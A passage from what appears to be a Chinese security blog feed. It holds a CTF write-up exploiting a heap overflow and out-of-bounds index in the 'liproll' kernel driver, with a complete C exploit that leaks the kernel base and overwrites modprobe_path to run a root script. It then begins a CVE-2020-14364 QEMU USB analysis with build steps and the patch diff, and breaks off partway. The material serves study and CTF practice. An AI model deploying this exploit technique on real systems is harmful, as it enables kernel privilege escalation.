class="line">  v0 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    index = (<span class="type">int</span>)v0;</span><br><span class="line">    <span class="keyword">if</span> ( !lists[v0] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ++v0 == <span class="number">0x10</span> )</span><br><span class="line">      <span class="keyword">return</span> printk(<span class="string">&quot;[-] Full!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  result = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">8</span>], <span class="number">0xCC0</span>LL, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> kmalloc_err();</span><br><span class="line">  lists[index] = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里是固定分配了一个<code>0x100</code>大小的堆块然后将分配得到的地址写入到了<code>lists</code>数组中，该数组的元素个数为<code>0x10</code>个。接着是<code>show</code>函数，也就是<code>choose_a_spell</code>函数，该函数将用户指定的<code>lists[index]</code>中保存的堆块地址赋值到<code>global_buffer</code>全局变量中。然后是<code>reset_spell</code>也就是<code>cmd=0xD3C7F02</code>发生的系统调用，这里是将<code>global_buffer</code>清空。</p><p>最后是<code>cast_a_spell</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">cast_a_spell</span><span class="params">(__int64 *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// edx</span></span><br><span class="line">  __int64 buf; <span class="comment">// rsi</span></span><br><span class="line">  _BYTE kernel_buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> copyed_size; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+110h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !global_buffer )</span><br><span class="line">    <span class="keyword">return</span> ((__int64 (*)(<span class="type">void</span>))cast_a_spell_cold)();</span><br><span class="line">  v6 = global_buffer;</span><br><span class="line">  size = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  v2 = <span class="number">0x100</span>;</span><br><span class="line">  buf = *a1;</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    v2 = *((_DWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">  copyed_size = v2;</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(kernel_buf, buf, size) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(global_buffer, kernel_buf, *((<span class="type">unsigned</span> <span class="type">int</span> *)a1 + <span class="number">2</span>));</span><br><span class="line">    global_buffer = v6;</span><br><span class="line">    *((_DWORD *)&amp;global_buffer + <span class="number">2</span>) = copyed_size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数中最为重要的就是两个拷贝操作了，首先是<code>copy_from_user(kernel_buf, buf, size)</code>，这里的<code>buf</code>是用户输入的<code>buf</code>，也就是首先按照用户指定的大小将用户指定的内容拷贝到<code>kernel_buf</code>数组中，接着是<code>memcpy(global_buffer, kernel_buf, *((unsigned int *)a1 + 2));</code>也是按照用户指定的大小将<code>kernel_buf</code>中的数据拷贝到<code>global_buffer</code>也就是之前分配的堆块中。这里很明显的可以看到有堆溢出，虽然在拷贝之前进行了<code>size</code>的验证，但是拷贝过程中却是使用的用户指定的<code>size</code>。</p><h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>首先我们看一下溢出可以覆盖什么，这里溢出直接溢出的是<code>global_buffer</code>和<code>kernel_buffer</code>，<code>kernel_buffer</code>溢出之后会覆写<code>v6</code>，然而我们看到<code>v6</code>最终会被赋值为<code>global_buffer</code>，也就是我们可以通过溢出控制<code>global_buffer</code>指针，达到任意地址写的效果。</p><p>但是这里还存在一个问题就是地址泄漏。这里就需要利用到另一个漏洞，也就是索引越界，所有的函数并没有对<code>lists[index]</code>的索引值进行检查，因此存在一个索引越界的漏洞，而<code>lists</code>数组的高地址位置恰好为<code>vmlinux_base</code>也就是内核的基地址，这是在<code>open</code>函数中进行赋值的。因此这里可以读取<code>vmlinux_base</code>中指向的代码块的内容。从代码中可以根据重定位之后的数据泄漏的到<code>vmlinux</code>的基地址。也就是得到了内核基地址。</p><p>这里使用的是覆写<code>modprobe_path</code>的方法。将其覆写为指定的脚本，那么当程序执行一个错误的二进制文件的时候脚本就会被触发执行。</p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>这里遇到一个问题就是通过<code>lsmod</code>或者直接<code>cat /proc/module</code>显示出来的基地址和<code>ida</code>中的函数偏移无法对应。之后才知道这是内核开启了<code>FG_KASLR</code>机制，该机制是<code>KASLR</code>的加强版，全称是<code>Function Granular KASLR</code>，译为函数颗粒化地址随机分布。一般来说开启了<code>KASLR</code>，会使得目标文件加载到内存的其实地址随机化，而<code>FG-KASLR</code>则是按照函数级别对内核代码进行重新排列。也就是说我们无法直接通过泄漏出内核的其实地址而根据<code>offset</code>确定对应的函数地址了，因为此时函数之间的顺序被打乱了。</p><p>在调试的时候可以通过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /sys/module/liproll/sections/.text.cast_a_spell</span><br></pre></td></tr></table></figure><p>来依次确定我们想要的函数的地址，再下断点。</p><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">spell_struct</span>&#123;</span></span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sz;</span><br><span class="line">&#125;Spell;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/liproll&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cast_spell</span><span class="params">(<span class="type">char</span>* buf,<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    Spell sp;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;sp,<span class="number">0</span>,<span class="keyword">sizeof</span>(Spell));</span><br><span class="line">    sp.buf = buf;</span><br><span class="line">    sp.sz = sz;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F01</span>,&amp;sp))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl cast spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reset_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F02</span>,buf))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl reset spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">create_spell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x8</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F03</span>,buf))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl create spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">choose_spell</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == ioctl(fd,<span class="number">0xD3C7F04</span>,&amp;idx))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-]err when ioctl choose spell.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//leak sth</span></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x200</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /root/flag /tmp/flag\n/bin/chmod 777 /tmp/flag&#x27; &gt; /tmp/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/getflag.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/ll&quot;</span>);</span><br><span class="line">init();</span><br><span class="line">    create_spell();</span><br><span class="line">    create_spell();</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    choose_spell(<span class="number">0</span>);</span><br><span class="line">    read(fd,buf,<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">//leak sth about the slab ?</span></span><br><span class="line">    choose_spell(<span class="number">16</span>);</span><br><span class="line">    read(fd,buf,<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">//leak vmlinux base</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> leak_vmliux = *(<span class="type">unsigned</span> <span class="type">int</span>*)((<span class="type">char</span>*)(buf+<span class="number">0x69</span>));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> vmlinux_base = <span class="number">0xffffffff00000000</span> + leak_vmliux - <span class="number">0x6f</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> request_module = (<span class="number">0xffffffffb4662180</span><span class="number">-0xffffffffb3e00000</span>) + vmlinux_base;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> modprobe_path  = (<span class="number">0xffffffffb5248460</span><span class="number">-0xffffffffb3e00000</span>) + vmlinux_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]vmlinux base : 0x%llx\n&quot;</span>,vmlinux_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]request module : 0x%llx\n&quot;</span>,request_module);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]modprobe path : 0x%llx\n&quot;</span>,modprobe_path);</span><br><span class="line">    <span class="comment">//overwrite the modprobe_path</span></span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)(buf+<span class="number">0x100</span>) = modprobe_path;</span><br><span class="line">    choose_spell(<span class="number">0</span>);</span><br><span class="line">    cast_spell(buf,<span class="number">0x108</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(buf,<span class="string">&quot;/tmp/getflag.sh&quot;</span>,<span class="number">0x20</span>);</span><br><span class="line">    cast_spell(buf,<span class="number">0x20</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/ll&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /tmp/flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/4272e0805da3">TEA、XTEA、XXTEA加密解密算法</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-14364 QEMU 越界读写漏洞复现&amp;分析</title>
      <link href="/posts/3399981355.html"/>
      <url>/posts/3399981355.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>创建<code>usb</code>设备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">qemu-img create -f raw usb.img 32M</span><br><span class="line">mkfs.vfat usb.img</span><br></pre></td></tr></table></figure><p>编译<code>qemu</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git://git.qemu-project.org/qemu.git</span><br><span class="line"><span class="built_in">cd</span> qemu</span><br><span class="line">git checkout tags/v4.2.1</span><br><span class="line"><span class="built_in">mkdir</span> -p bin/debug/naive</span><br><span class="line"><span class="built_in">cd</span> bin/debug/naive</span><br><span class="line">../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror --enable-spice</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>编译完成的二进制文件位于<code>bin/debug/naive/x86_64-softmmu/qemu-system-x86_64</code>，启动脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 1G -nographic \</span><br><span class="line">    -hda ./rootfs.img \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda rw&quot;</span> \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::2222-:22 \</span><br><span class="line">    -usb \</span><br><span class="line">    -drive <span class="keyword">if</span>=none,format=raw,<span class="built_in">id</span>=disk1,file=./CVE-2020-14364/usb.img \</span><br><span class="line">    -device ich9-usb-ehci1,<span class="built_in">id</span>=usb \ <span class="comment"># 添加的usb控制总线</span></span><br><span class="line">    -device usb-storage,drive=disk1 \</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先看一下<code>CVE</code>中的漏洞描述</p><blockquote><p>An out-of-bounds read/write access flaw was found in the USB emulator of the QEMU in versions before 5.2.0. This issue occurs while processing USB packets from a guest when USBDevice ‘setup_len’ exceeds its ‘data_buf[4096]’ in the do_token_in, do_token_out routines. This flaw allows a guest user to crash the QEMU process, resulting in a denial of service, or the potential execution of arbitrary code with the privileges of the QEMU process on the host.</p></blockquote><p>即在函数中正在处理的<code>USB</code>数据包的<code>setup_len</code>可以超过了<code>4096</code>限制，从而造成越界的读写。看一下<a href="https://git.qemu.org/?p=qemu.git;a=commit;h=b946434f2659a182afc17e155be6791ebfb302eb">patch</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/hw/usb/core.c b/hw/usb/core.c</span></span><br><span class="line"><span class="comment">index 5abd128..5234dcc 100644 (file)</span></span><br><span class="line"><span class="comment">--- a/hw/usb/core.c</span></span><br><span class="line"><span class="comment">+++ b/hw/usb/core.c</span></span><br><span class="line"><span class="meta">@@ -129,6 +129,7 @@</span> void usb_wakeup(USBEndpoint *ep, unsigned int stream)</span><br><span class="line"> static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;iov.size != 8) &#123;</span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line"><span class="meta">@@ -138,14 +139,15 @@</span> static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line">     usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line">     p-&gt;actual_length = 0;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;,</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line"><span class="meta">@@ -259,26 +261,28 @@</span> static void do_token_out(USBDevice *s, USBPacket *p)</span><br><span class="line"> static void do_parameter(USBDevice *s, USBPacket *p)</span><br><span class="line"> &#123;</span><br><span class="line">     int i, request, value, index;</span><br><span class="line"><span class="addition">+    unsigned int setup_len;</span></span><br><span class="line"> </span><br><span class="line">     for (i = 0; i &lt; 8; i++) &#123;</span><br><span class="line">         s-&gt;setup_buf[i] = p-&gt;parameter &gt;&gt; (i*8);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     s-&gt;setup_state = SETUP_STATE_PARAM;</span><br><span class="line"><span class="deletion">-    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line">     s-&gt;setup_index = 0;</span><br><span class="line"> </span><br><span class="line">     request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">     value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line">     index   = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4];</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line"><span class="addition">+    setup_len = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span></span><br><span class="line"><span class="addition">+    if (setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span></span><br><span class="line">         fprintf(stderr,</span><br><span class="line">                 &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;,</span><br><span class="line"><span class="deletion">-                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line"><span class="addition">+                setup_len, sizeof(s-&gt;data_buf));</span></span><br><span class="line">         p-&gt;status = USB_RET_STALL;</span><br><span class="line">         return;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="addition">+    s-&gt;setup_len = setup_len;</span></span><br><span class="line"> </span><br><span class="line">     if (p-&gt;pid == USB_TOKEN_OUT) &#123;</span><br><span class="line">         usb_packet_copy(p, s-&gt;data_buf, s-&gt;setup_len);</span><br></pre></td></tr></table></figure><p>可以看到这里的<code>patch</code>是增加了一个临时变量用来检查<code>setup_len</code>是否符合要求，之后在进行赋值。相当于为<code>s-&gt;setup_len</code>增加了一个回滚操作。</p><p>看一下关键部分的数据结构和代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* definition of a USB device */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">USBDevice</span> &#123;</span></span><br><span class="line">    DeviceState qdev;</span><br><span class="line">    USBPort *port;</span><br><span class="line">    <span class="type">char</span> *port_path;</span><br><span class="line">    <span class="type">char</span> *serial;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Actual connected speed */</span></span><br><span class="line">    <span class="type">int</span> speed;</span><br><span class="line">    <span class="comment">/* Supported speeds, not in info because it may be variable (hostdevs) */</span></span><br><span class="line">    <span class="type">int</span> speedmask;</span><br><span class="line">    <span class="type">uint8_t</span> addr;</span><br><span class="line">    <span class="type">char</span> product_desc[<span class="number">32</span>];</span><br><span class="line">    <span class="type">int</span> auto_attach;</span><br><span class="line">    <span class="type">bool</span> attached;</span><br><span class="line"></span><br><span class="line">    <span class="type">int32_t</span> state;</span><br><span class="line">    <span class="type">uint8_t</span> setup_buf[<span class="number">8</span>];</span><br><span class="line">    <span class="type">uint8_t</span> data_buf[<span class="number">4096</span>];</span><br><span class="line">    <span class="type">int32_t</span> remote_wakeup;</span><br><span class="line">    <span class="type">int32_t</span> setup_state;</span><br><span class="line">    <span class="type">int32_t</span> setup_len;</span><br><span class="line">    <span class="type">int32_t</span> setup_index;</span><br><span class="line"></span><br><span class="line">    USBEndpoint ep_ctl;</span><br><span class="line">    USBEndpoint ep_in[USB_MAX_ENDPOINTS];</span><br><span class="line">    USBEndpoint ep_out[USB_MAX_ENDPOINTS];</span><br><span class="line"></span><br><span class="line">    QLIST_HEAD(, USBDescString) strings;</span><br><span class="line">    <span class="type">const</span> USBDesc *usb_desc; <span class="comment">/* Overrides class usb_desc if not NULL */</span></span><br><span class="line">    <span class="type">const</span> USBDescDevice *device;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> configuration;</span><br><span class="line">    <span class="type">int</span> 